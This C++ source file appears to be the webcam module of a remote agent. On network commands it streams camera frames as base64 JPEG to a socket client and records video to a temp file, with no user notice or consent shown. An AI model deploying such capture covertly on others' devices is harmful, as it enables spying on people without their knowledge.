#include "webcam.h"
#include "utils.h"

#include <atomic>
#include <chrono>
#include <filesystem>
#include <mutex>
#include <string>
#include <thread>

#ifdef _WIN32
#include <winsock2.h>
#else
#include <sys/socket.h>
#include <unistd.h>
#endif

#ifdef HAVE_OPENCV
#include <opencv2/opencv.hpp>
#endif

namespace fs = std::filesystem;

#ifdef _WIN32
static const SocketType kInvalidSocket = INVALID_SOCKET;
#else
static const SocketType kInvalidSocket = -1;
#endif

static std::mutex g_stateMutex;
static std::atomic<bool> g_streaming{false};
static std::atomic<bool> g_recording{false};
static SocketType g_frameClient = kInvalidSocket;

#ifdef HAVE_OPENCV
static cv::VideoCapture g_cap;
static cv::VideoWriter g_writer;
static std::string g_recordPath;
static std::string g_recordFileName;
static int g_frameW = 0;
static int g_frameH = 0;
#endif

static void sendAllSock(SocketType s, const std::string& data) {
    size_t total = 0;
    while (total < data.size()) {
        const int n = send(s, data.c_str() + static_cast<int>(total),
                           static_cast<int>(data.size() - total), 0);
        if (n <= 0) return;
        total += static_cast<size_t>(n);
    }
}

static std::string jsonErr(const std::string& cmd, const std::string& msg) {
    return "{\"ok\":false,\"command\":\"" + cmd + "\",\"message\":\"" + escapeJson(msg) + "\"}";
}

#ifndef HAVE_OPENCV

std::string webcamStartSession(SocketType client) {
    (void)client;
    return jsonErr("WEBCAM_START", "agent built without OpenCV; install OpenCV and rebuild");
}

void webcamStopSession() {}

std::string startWebcamRecordJson() {
    return jsonErr("WEBCAM_RECORD_START", "agent built without OpenCV");
}

std::string stopWebcamRecordJson() {
    return jsonErr("WEBCAM_RECORD_STOP", "agent built without OpenCV");
}

#else

static bool openCapture(cv::VideoCapture& cap) {
#ifdef __APPLE__
    if (cap.open(0, cv::CAP_AVFOUNDATION)) return true;
#endif
#ifdef _WIN32
    if (cap.open(0, cv::CAP_MSMF)) return true;
#endif
    return cap.open(0);
}

static void closeWriterLocked() {
    if (g_writer.isOpened()) {
        g_writer.release();
    }
    g_recordPath.clear();
    g_recordFileName.clear();
    g_recording = false;
}

static void workerLoop() {
    const int jpegQuality = 72;
    const int sleepMs = 50;

    while (g_streaming) {
        cv::Mat frame;
        {
            std::lock_guard<std::mutex> lock(g_stateMutex);
            if (!g_cap.isOpened()) break;
            if (!g_cap.read(frame) || frame.empty()) {
                frame.release();
            } else {
                g_frameW = frame.cols;
                g_frameH = frame.rows;
                if (g_recording && g_writer.isOpened()) {
                    g_writer.write(frame);
                }
            }
        }

        if (frame.empty()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }

        std::vector<unsigned char> jpg;
        const std::vector<int> params = {cv::IMWRITE_JPEG_QUALITY, jpegQuality};
        if (!cv::imencode(".jpg", frame, jpg, params)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(sleepMs));
            continue;
        }

        const std::string b64 = base64Encode(jpg);

        SocketType client = kInvalidSocket;
        {
            std::lock_guard<std::mutex> lock(g_stateMutex);
            client = g_frameClient;
        }
        if (client == kInvalidSocket) {
            std::this_thread::sleep_for(std::chrono::milliseconds(sleepMs));
            continue;
        }

        std::string msg = "{\"ok\":true,\"command\":\"WEBCAM_FRAME\",\"mime\":\"image/jpeg\",\"data\":\"";
        msg += b64;
        msg += "\"}\n<<END>>\n";
        sendAllSock(client, msg);

        std::this_thread::sleep_for(std::chrono::milliseconds(sleepMs));
    }

    std::lock_guard<std::mutex> lock(g_stateMutex);
    closeWriterLocked();
    if (g_cap.isOpened()) g_cap.release();
    g_frameClient = kInvalidSocket;
}

std::string webcamStartSession(SocketType client) {
    if (client == kInvalidSocket) return jsonErr("WEBCAM_START", "invalid_client");

    {
        std::lock_guard<std::mutex> lock(g_stateMutex);
        if (g_streaming) return jsonErr("WEBCAM_START", "already_running");
    }

    cv::VideoCapture tmp;
    if (!openCapture(tmp) || !tmp.isOpened()) {
        return jsonErr("WEBCAM_START", "cannot_open_camera");
    }

    {
        std::lock_guard<std::mutex> lock(g_stateMutex);
        if (g_streaming) return jsonErr("WEBCAM_START", "already_running");
        g_cap.release();
        g_cap.swap(tmp);
        g_frameClient = client;
        g_streaming = true;
    }

    std::thread(workerLoop).detach();
    return "{\"ok\":true,\"command\":\"WEBCAM_START\"}";
}

void webcamStopSession() {
    g_streaming = false;
    std::this_thread::sleep_for(std::chrono::milliseconds(250));

    std::lock_guard<std::mutex> lock(g_stateMutex);
    closeWriterLocked();
    if (g_cap.isOpened()) g_cap.release();
    g_frameClient = kInvalidSocket;
    g_frameW = 0;
    g_frameH = 0;
}

std::string startWebcamRecordJson() {
    if (!g_streaming) return jsonErr("WEBCAM_RECORD_START", "webcam_not_started");

    std::lock_guard<std::mutex> lock(g_stateMutex);
    if (!g_cap.isOpened()) return jsonErr("WEBCAM_RECORD_START", "camera_not_ready");
    if (g_recording && g_writer.isOpened()) return jsonErr("WEBCAM_RECORD_START", "already_recording");
    if (g_frameW <= 0 || g_frameH <= 0) return jsonErr("WEBCAM_RECORD_START", "no_frame_yet");

    try {
        const auto dir = fs::temp_directory_path();
        const auto stamp = std::chrono::steady_clock::now().time_since_epoch().count();
        g_recordFileName = "webcam_rec_" + std::to_string(stamp) + ".avi";
        g_recordPath = (dir / g_recordFileName).string();
    } catch (...) {
        return jsonErr("WEBCAM_RECORD_START", "temp_path_failed");
    }

    const double fps = 20.0;
    const int fourcc = cv::VideoWriter::fourcc('M', 'J', 'P', 'G');
    g_writer.open(g_recordPath, fourcc, fps, cv::Size(g_frameW, g_frameH), true);
    if (!g_writer.isOpened()) {
        g_recordPath.clear();
        g_recordFileName.clear();
        return jsonErr("WEBCAM_RECORD_START", "writer_open_failed");
    }

    g_recording = true;
    return "{\"ok\":true,\"command\":\"WEBCAM_RECORD_START\"}";
}

std::string stopWebcamRecordJson() {
    std::string pathCopy;
    std::string nameCopy;

    {
        std::lock_guard<std::mutex> lock(g_stateMutex);
        if (!g_recording && !g_writer.isOpened()) {
            return jsonErr("WEBCAM_RECORD_STOP", "not_recording");
        }
        pathCopy = g_recordPath;
        nameCopy = g_recordFileName;
        closeWriterLocked();
    }

    if (pathCopy.empty()) return jsonErr("WEBCAM_RECORD_STOP", "no_output_path");

    return "{\"ok\":true,\"command\":\"WEBCAM_RECORD_STOP\",\"path\":\"" + escapeJson(pathCopy) +
           "\",\"filename\":\"" + escapeJson(nameCopy) + "\"}";
}

#endif
